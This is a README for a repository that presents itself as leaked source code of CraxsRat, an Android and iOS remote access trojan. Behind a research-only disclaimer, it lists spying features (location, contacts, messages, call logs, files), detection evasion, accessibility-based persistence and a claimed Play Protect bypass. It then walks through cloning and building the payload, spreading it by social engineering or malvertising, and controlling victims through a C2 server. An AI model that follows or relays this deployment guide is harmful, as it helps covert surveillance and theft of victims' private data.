* CraxsRat Source Code

*  & This repository contains the leaked source code of CraxsRat, a sophisticated Android && iOS remote access trojan ( RAT ) developed by "EVLF DEV". CraxsRat has been used in various cyber-attacks to grant cybercriminals extensive control over infected devices.

Disclaimer
Warning: This repository contains malicious code and is intended for cybersecurity research and educational purposes only. The use of this code for any unauthorized or illegal activities is strictly prohibited and punishable by law. By using this code, you agree to use it responsibly and comply with all applicable laws and regulations.

* Features
* Device Location Retrieval: Obtain the precise location of the infected device.
* Contact Exfiltration: Extract contacts from the device.
* Storage Access: Access and manipulate files stored on the device.
* Message and Call Log Compromise: Access and manipulate SMS messages and call logs.
* Obfuscation and Anti-Removal: Generate highly obfuscated packages to evade detection and prevent removal.
* Accessibility Exploitation: Modify the accessibility settings page to maintain persistence.
* Google Play Protect Bypass: The latest version, v7.4, can bypass Google’s built-in antivirus system, Google Play Protect.
* Installation

* Defines a XAML template, potentially for UI components or styles.
* Requirements
* Android && iOS device ( target )
* Builder application to create the RAT payload
* Setup

# Clone the Repository:
    git clone https://github.com/YafetTesfahuney/aaayafuj_Craxs_Rat_Access_V7.git
    cd aaayafuj_Craxs_Rat_Access_V7
    python -m venv venv
    venv\Scripts\activate
    pip install -r requirements.txt  --break-system-packages
    python main.py

Open it with vs & Builder Configuration:

# Open the project .sln file with vs
* Follow the instructions in the builder directory to set up and configure the RAT payload.
* Customize the payload to suit your specific requirements.
* Payload Deployment:

* Distribute the RAT payload through social engineering, malvertising, or other methods.
* Ensure the payload is installed on the target device.
* Usage
# Control the Infected Device:

* Use the command and control (C2) server to send commands to the infected device.
  Retrieve location, contacts, messages, call logs, and access stored files.
  Maintain Persistence:

Utilize the obfuscation features to keep the RAT hidden from the user and security software.
Ensure the RAT's accessibility settings are enabled to maintain control over the device.
